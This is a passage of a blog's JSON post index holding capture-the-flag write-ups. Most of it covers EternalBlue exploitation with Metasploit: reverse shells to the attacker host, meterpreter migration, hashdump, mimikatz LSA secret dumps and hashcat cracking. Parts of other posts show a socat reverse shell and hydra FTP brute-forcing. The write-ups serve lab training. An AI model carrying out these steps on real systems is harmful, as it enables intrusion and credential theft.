FILE:`tty`,raw,echo=0 TCP:10.10.131.100:1111 sh: 0: can\u0026#39;t access tty; job control turned off # pwd /home/falconfeast # cd /root # ls root.txt # cat root.txt 42964104845495153909 Ou yeah, we have root priviledges! :) root flag\n42964104845495153909 socat is really strong network utility, I recommend to read more about it. Have a another nice day with COVID-19. bye;)\n","permalink":"https://www.burso.eu/posts/inclusion/","summary":"Hi guys, after long time I have 5 minutes for playing game, so let\u0026rsquo;s play. I see new game called Inclusion with describe A beginner level LFI challenge. Yes, this is something I want to play and have been done quick.\nSo I am starting VPN tunnel to our playground and click on magic button Deploy machine.\nAs always first scan ports opened on the machine.\n$ nmap -T4 -sV 10.","title":"Inclusion"},{"content":"Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let\u0026rsquo;s start with nmap scan.\n$ nmap -sV -p0-1000 --script vuln 10.10.223.243 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 14:40 CET Nmap scan report for 10.10.223.243 Host is up (0.043s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC |_clamav-exec: ERROR: Script execution failed (use -d to debug) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn |_clamav-exec: ERROR: Script execution failed (use -d to debug) 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) |_clamav-exec: ERROR: Script execution failed (use -d to debug) Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.73 seconds How many ports are open with a port number under 1000?:\n3 What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)\nms17-010 MS17-010 is very unstable exploit, it doesn\u0026rsquo;t work in my linux or macos machine. But it works in my android with termux app. You can also buy PRO account and use their own kali machine. So now I connect to my android phone and then we will continue to exploit server\n$ ssh 192.168.xx.yy -p8022 -lxxx_yyy Welcome to Termux! Wiki: https://wiki.termux.com Community forum: https://termux.com/community Gitter chat: https://gitter.im/termux/termux IRC channel: #termux on freenode Working with packages: * Search packages: pkg search \u0026lt;query\u0026gt; * Install a package: pkg install \u0026lt;package\u0026gt; * Upgrade packages: pkg upgrade Subscribing to additional repositories: * Root: pkg install root-repo * Unstable: pkg install unstable-repo * X11: pkg install x11-repo Report issues at https://termux.com/issues $ Now we can continue as on any other devices, so let\u0026rsquo;s start metasploit\nUnable to handle kernel NULL pointer dereference at virtual address 0xd34db33f EFLAGS: 00010046 eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001 esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60 ds: 0018 es: 0018 ss: 0018 Process Swapper (Pid: 0, process nr: 0, stackpage=80377000) Stack: 90909090990909090990909090 90909090990909090990909090 90909090.90909090.90909090 90909090.90909090.90909090 90909090.90909090.09090900 90909090.90909090.09090900 .......................... cccccccccccccccccccccccccc cccccccccccccccccccccccccc ccccccccc................. cccccccccccccccccccccccccc cccccccccccccccccccccccccc .................ccccccccc cccccccccccccccccccccccccc cccccccccccccccccccccccccc .......................... ffffffffffffffffffffffffff ffffffff.................. ffffffffffffffffffffffffff ffffffff.................. ffffffff.................. ffffffff.................. Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00 Aiee, Killing Interrupt handler Kernel panic: Attempted to kill the idle task! In swapper task - not syncing =[ metasploit v5.0.79-dev ] + -- --=[ 1979 exploits - 1087 auxiliary - 339 post ] + -- --=[ 559 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] msf5 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 1 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 2 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 3 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 4 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 5 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/\u0026hellip;\u0026hellip;..)\nexploit/windows/smb/ms17_010_eternalblue msf5 \u0026gt; use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set RHOSTS 10.10.223.243 Show options and set the one required value. What is the name of this value? (All caps for submission)\nRHOSTS msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; exploit [*] Started reverse TCP handler on 10.8.11.158:4444 [*] 10.10.223.243:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.223.243:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.223.243:445 - Scanned 1 of 1 hosts (100% complete) [*] 10.10.223.243:445 - Connecting to target for exploitation. [+] 10.10.223.243:445 - Connection established for exploitation. [+] 10.10.223.243:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.223.243:445 - CORE raw buffer dump (42 bytes) [*] 10.10.223.243:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.223.243:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.223.243:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.223.243:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.223.243:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.223.243:445 - Sending all but last fragment of exploit packet [*] 10.10.223.243:445 - Starting non-paged pool grooming [+] 10.10.223.243:445 - Sending SMBv2 buffers [+] 10.10.223.243:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.223.243:445 - Sending final SMBv2 buffers. [*] 10.10.223.243:445 - Sending last fragment of exploit packet! [*] 10.10.223.243:445 - Receiving response from exploit packet [+] 10.10.223.243:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.223.243:445 - Sending egg to corrupted connection. [*] 10.10.223.243:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.8.11.158:4444 -\u0026gt; 10.10.223.243:49187) at 2020-03-20 11:49:18 +0100 [+] 10.10.223.243:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.223.243:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.223.243:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= C:\\Windows\\system32\u0026gt; Okey, we\u0026rsquo;re in, so let\u0026rsquo;s background the process and migrate shell to meterpreter\nC:\\Windows\\system32\u0026gt;^Z Background session 1? [y/N] y msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; use post/multi/manage/shell_to_meterpreter If you haven\u0026rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)\npost/multi/manage/shell_to_meterpreter msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; show options Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on. Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)\nSESSION msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; show sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.11.158:4444 -\u0026gt; 10.10.223.243:49187 (10.10.223.243) msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set SESSION 1 SESSION =\u0026gt; 1 msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.8.11.158:4433 [*] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; [*] Sending stage (180291 bytes) to 10.10.223.243 [*] Meterpreter session 2 opened (10.8.11.158:4433 -\u0026gt; 10.10.223.243:49197) at 2020-03-20 11:57:43 +0100 [*] Stopping exploit/multi/handler msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; show sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.11.158:4444 -\u0026gt; 10.10.223.243:49187 (10.10.223.243) 2 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.8.11.158:4433 -\u0026gt; 10.10.223.243:49197 (10.10.223.243) Migrating shell to meterpreter was successful, so we have 2 sessions now. Let\u0026rsquo;s run the second one, the meterpreter session and migrate process to another process id.\nmsf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions 2 [*] Starting interaction with 2... meterpreter \u0026gt; getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). meterpreter \u0026gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 416 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\smss.exe 428 712 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 560 564 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 564 556 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 612 556 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wininit.exe 624 604 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 664 604 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\winlogon.exe 712 612 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\services.exe 720 612 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsass.exe 724 712 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 728 612 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsm.exe 836 712 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 904 712 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 952 712 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1020 664 LogonUI.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\LogonUI.exe 1128 712 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1184 1348 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\cmd.exe 1204 712 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 1348 712 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1384 712 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1448 712 amazon-ssm-agent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe 1524 712 LiteAgent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Xentools\\LiteAgent.exe 1664 712 Ec2Config.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Ec2ConfigService\\Ec2Config.exe 1996 712 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 2084 712 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\sppsvc.exe 2240 2920 powershell.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe 2368 2240 cmd.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\SysWOW64\\cmd.exe 2396 564 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 2404 712 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 2556 564 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 2572 712 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 2604 712 vds.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\vds.exe 2716 712 SearchIndexer.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\SearchIndexer.exe 2916 564 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 2920 2400 powershell.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 2996 2240 cmd.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\SysWOW64\\cmd.exe meterpreter \u0026gt; migrate 712 [*] Migrating from 2240 to 712... [*] Migration completed successfully. Yeah, migration was succesful, so we can dump the hashes of users passwords.\nmeterpreter \u0026gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: meterpreter \u0026gt; load kiwi Loading extension kiwi... .#####. mimikatz 2.2.0 20191125 (x64/windows) .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; http://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; http://pingcastle.com / http://mysmartlogon.com ***/ Success. meterpreter \u0026gt; lsa_dump_sam [+] Running as SYSTEM [*] Dumping SAM Domain : JON-PC SysKey : 55bd17830e678f18a3110daf2c17d4c7 Local SID : S-1-5-21-2633577515-2458672280-487782642 SAMKey : c74ee832c5b6f4030dbbc7b51a011b1e RID : 000001f4 (500) User : Administrator Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 RID : 000001f5 (501) User : Guest RID : 000003e8 (1000) User : Jon Hash NTLM: ffb43f0de35be4d9917ac0cc8ad57f8d meterpreter \u0026gt; lsa_dump_secrets [+] Running as SYSTEM [*] Dumping LSA secrets Domain : JON-PC SysKey : 55bd17830e678f18a3110daf2c17d4c7 Local name : Jon-PC ( S-1-5-21-2633577515-2458672280-487782642 ) Domain name : WORKGROUP Policy subsystem is : 1.11 LSA Key(s) : 1, default {888e8eec-afc6-d204-0da2-a847caf129ea} [00] {888e8eec-afc6-d204-0da2-a847caf129ea} c3c1bfae498011d6dd37f2710cc970a5e2d80f0e17e6c12237abaaceed8ce04f Secret : DefaultPassword old/text: CDCClubROX Secret : DPAPI_SYSTEM cur/hex : 01 00 00 00 dc 31 ac 35 e1 9a 18 b0 0b 5b 06 6d e3 e8 da 89 8b f8 da 71 fa ea 74 03 f4 2b 58 e1 a5 dd 35 ee 81 61 85 a9 53 b1 c7 95 full: dc31ac35e19a18b00b5b066de3e8da898bf8da71faea7403f42b58e1a5dd35ee816185a953b1c795 m/u : dc31ac35e19a18b00b5b066de3e8da898bf8da71 / faea7403f42b58e1a5dd35ee816185a953b1c795 old/hex : 01 00 00 00 c9 22 d6 0b 83 9e dd 98 a7 ad 7a 5a c5 ff 4e bb 8a d2 6f 01 61 be bf d4 bc 70 54 70 fd df 46 12 a8 c5 e5 2d 98 6c 79 71 full: c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f0161bebfd4bc705470fddf4612a8c5e52d986c7971 m/u : c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f01 / 61bebfd4bc705470fddf4612a8c5e52d986c7971 Secret : NL$KM cur/hex : 45 94 4a 93 a2 9d d2 8e 2b cf 5f df 66 75 59 4c e9 bc b8 91 2c 66 59 1e bf 53 1e 77 be c2 9b 74 73 64 04 b4 56 ea 7d 6f ba c2 1b 7e f0 ba 53 67 e6 e6 66 84 95 1f 90 60 42 ee 34 0a ee 99 9f 55 Within our elevated meterpreter shell, run the command \u0026lsquo;hashdump\u0026rsquo;. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?\nJon Now we can crack the hashes. It doesn\u0026rsquo;t care if we use john-the-ripper or hashcat.\n$ echo \u0026#39;ffb43f0de35be4d9917ac0cc8ad57f8d\u0026#39; \u0026gt; hashes.txt $ hashcat -m 1000 -O hashes.txt /usr/local/share/wordlists/rockyou.txt Dictionary cache hit: * Filename..: /usr/local/share/wordlists/rockyou.txt * Passwords.: 14344384 * Bytes.....: 139921497 * Keyspace..: 14344384 ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22 Session..........: hashcat Status...........: Cracked Hash.Type........: NTLM Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d Time.Started.....: Fri Mar 20 16:12:30 2020 (3 secs) Time.Estimated...: Fri Mar 20 16:12:33 2020 (0 secs) Guess.Base.......: File (/usr/local/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#2.........: 3946.0 kH/s (7.80ms) @ Accel:64 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 10223616/14344384 (71.27%) Rejected.........: 0/10223616 (0.00%) Restore.Point....: 10027008/14344384 (69.90%) Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#2....: april669 -\u0026gt; alisonodonnell1 Started: Fri Mar 20 16:12:27 2020 Stopped: Fri Mar 20 16:12:34 2020 Copy this password hash to a file and research how to crack it. What is the cracked password?\nalqfna22 meterpreter \u0026gt; cd C:/ meterpreter \u0026gt; pwd C:\\ meterpreter \u0026gt; ls Listing: C:\\ ============ Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2009-07-14 05:18:56 +0200 $Recycle.Bin 40777/rwxrwxrwx 0 dir 2009-07-14 07:08:56 +0200 Documents and Settings 40777/rwxrwxrwx 0 dir 2009-07-14 05:20:08 +0200 PerfLogs 40555/r-xr-xr-x 4096 dir 2009-07-14 05:20:08 +0200 Program Files 40555/r-xr-xr-x 4096 dir 2009-07-14 05:20:08 +0200 Program Files (x86) 40777/rwxrwxrwx 4096 dir 2009-07-14 05:20:08 +0200 ProgramData 40777/rwxrwxrwx 0 dir 2018-12-13 04:13:22 +0100 Recovery 40777/rwxrwxrwx 4096 dir 2018-12-13 00:01:17 +0100 System Volume Information 40555/r-xr-xr-x 4096 dir 2009-07-14 05:20:08 +0200 Users 40777/rwxrwxrwx 16384 dir 2009-07-14 05:20:08 +0200 Windows 100666/rw-rw-rw- 24 fil 2018-12-13 04:47:39 +0100 flag1.txt 0000/--------- 3089184 fif 1970-02-07 00:26:08 +0100 hiberfil.sys 0000/--------- 3089184 fif 1970-02-07 00:26:08 +0100 pagefile.sys meterpreter \u0026gt; cat flag1.txt flag{access_the_machine} Flag1? (Only submit the flag contents {CONTENTS})\naccess_the_machine For final steps, we return back to first session with basic command shell.\nmeterpreter \u0026gt; Background session 2? [y/N] msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions 1 [*] Starting interaction with 1... Name : ConsoleHost Version : 2.0 InstanceId : 6ab0de61-c602-4a6d-93f5-77a4f1f1c239 UI : System.Management.Automation.Internal.Host.InternalHostUserI nterface CurrentCulture : en-US CurrentUICulture : en-US PrivateData : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy IsRunspacePushed : False Runspace : System.Management.Automation.Runspaces.LocalRunspace TJACJVXvCYTTfrcbvutJpyWlidgPcITh C:\\Windows\\system32\u0026gt;cd C:\\ cd C:\\ C:\\\u0026gt;dir flag* /s /p dir flag* /s /p Volume in drive C has no label. Volume Serial Number is E611-0B66 Directory of C:\\ 03/17/2019 02:27 PM 24 flag1.txt 1 File(s) 24 bytes Directory of C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent 03/17/2019 02:26 PM 482 flag1.lnk 03/17/2019 02:30 PM 848 flag2.lnk 03/17/2019 02:32 PM 2,344 flag3.lnk 3 File(s) 3,674 bytes Directory of C:\\Users\\Jon\\Documents 03/17/2019 02:26 PM 37 flag3.txt 1 File(s) 37 bytes Directory of C:\\Windows\\System32\\config 03/17/2019 02:32 PM 34 flag2.txt 1 File(s) 34 bytes Total Files Listed: 6 File(s) 3,769 bytes 0 Dir(s) 22,707,953,664 bytes free C:\\\u0026gt;type C:\\Windows\\System32\\config\\flag2.txt type C:\\Windows\\System32\\config\\flag2.txt flag{sam_database_elevated_access} C:\\\u0026gt;type C:\\Users\\Jon\\Documents\\flag3.txt type C:\\Users\\Jon\\Documents\\flag3.txt flag{admin_documents_can_be_valuable} C:\\\u0026gt; Flag2? *Errata: Windows really doesn\u0026rsquo;t like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.\nsam_database_elevated_access flag3?\nadmin_documents_can_be_valuable And that\u0026rsquo;s it, we have NT AUTHORITY\\SYSTEM priviledges, we have all the flags, cracked Jon password. We\u0026rsquo;re done here! I hope you enjoyed it, bye;)\n","permalink":"https://www.burso.eu/posts/blue/","summary":"Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let\u0026rsquo;s start with nmap scan.\n$ nmap -sV -p0-1000 --script vuln 10.10.223.243 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 14:40 CET Nmap scan report for 10.10.223.243 Host is up (0.043s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC |_clamav-exec: ERROR: Script execution failed (use -d to debug) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn |_clamav-exec: ERROR: Script execution failed (use -d to debug) 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) |_clamav-exec: ERROR: Script execution failed (use -d to debug) Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010).","title":"Blue"},{"content":"Before we start, read more about following tools \u0026amp; vulnerabilities. It will contains in this CTF\nhydra screen - CVE-2017-5618 knock and also you can read more about additional security method called port knocking\nSo let\u0026rsquo;s start as usual with nmap.\nnmap -F --top-ports 10 -sV 10.10.219.90 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 16:37 CET Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Stats: 0:02:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 97.16% done; ETC: 16:40 (0:00:00 remaining) Nmap scan report for 10.10.219.90 Host is up (0.38s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp closed ssh 23/tcp open telnet? 25/tcp open smtp? 80/tcp open http? 110/tcp open pop3? 139/tcp open netbios-ssn? 443/tcp open https? 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server? After scan, we can see many ports open, but only from FTP we have grabbed banner vsftpd 2.0.8 or later. From description of this game we know the developer\u0026rsquo;s name: Jerry, so we can try brute force attack to FTP server.\n$ hydra -ljerry -P /usr/share/dict/rockyou.txt ftp://10.10.219.90 -t 16 -vV Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-10 16:28:50 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344409 login tries (l:1/p:14344409), ~896526 tries per task [DATA] attacking ftp://10.10.219.90:21/ [VERBOSE] Resolving addresses ... [VERBOSE] resolving done [ATTEMPT] target 10.10.219.90 - login \u0026#34;jerry\u0026#34; - pass \u0026#34;\u0026#34; - 1 of 14344409 [child 0] (0/0) [ATTEMPT] target 10.10.219.90 - login \u0026#34;jerry\u0026#34; - pass \u0026#34; \u0026#34; - 2 of 14344409 [child 1] (0/0) [ATTEMPT] target 10.10.219.90 - login \u0026#34;jerry\u0026#34; - pass \u0026#34; \u0026#34; - 3 of 14344409 [child 2] (0/0) [ATTEMPT] target 10.10.219.90 - login \u0026#34;jerry\u0026#34; - pass \u0026#34; \u0026#34; - 4 of 14344409 [child 3] (0/0) [ATTEMPT] target 10.10.219.90 - login \u0026#34;jerry\u0026#34; - pass \u0026#34; \u0026#34; - 5 of 14344409 [child 4] (0/0) [ATTEMPT] target 10.10.219.90 - login \u0026#34;jerry\u0026#34; - pass \u0026#34; \u0026#34; - 6 of 14344409 [child 5] (0/0) [ATTEMPT] target 10.10.219.90 - login \u0026#34;jerry\u0026#34; - pass \u0026#34; \u0026#34; - 7 of 14344409 [child 6] (0/0) [ATTEMPT] target 10.10.219.90 - login \u0026#34;jerry\u0026#34; - pass \u0026#34; \u0026#34; - 8 of 14344409 [child 7] (0/0) [ATTEMPT] target 10.10.219.90 - login \u0026#34;jerry\u0026#34; - pass \u0026#34; \u0026#34; - 9 of 14344409 [child 8] (0/0) [ATTEMPT] target 10.10.219.90 - login \u0026#34;jerry\u0026#34; - pass \u0026#34; \u0026#34; - 10 of 14344409 [child 9] (0/0) [ATTEMPT] target 10.10.219.90 - login \u0026#34;jerry\u0026#34; - pass \u0026#34; \u0026#34; - 11 of 14344409 [child 10] (0/0) ... [ATTEMPT] target 10.10.219.90 - login \u0026#34;jerry\u0026#34; - pass \u0026#34;prumpy\u0026#34; - 1 of 1 [child 0] (0/0) [21][ftp] host: 10.10.219.90 login: jerry password: prumpy [STATUS] attack finished for 10.10.219.90 (waiting for children to complete tests) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-10 16:28:01 And voilà, we have a password: prumpy. Connect to FTP with jerry:prumpy and let\u0026rsquo;s find out what is hide inside.\n$ ftp 10.10.219.90 Connected to 10.10.219.90. 220 TryHackMe Networking CTF! Name (10.10.219.90:burso): jerry 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; passive Passive mode on. ftp\u0026gt; ls 227 Entering Passive Mode (10,10,219,90,89,219). 150 Here comes the directory listing. -rwxr-xr-x 1 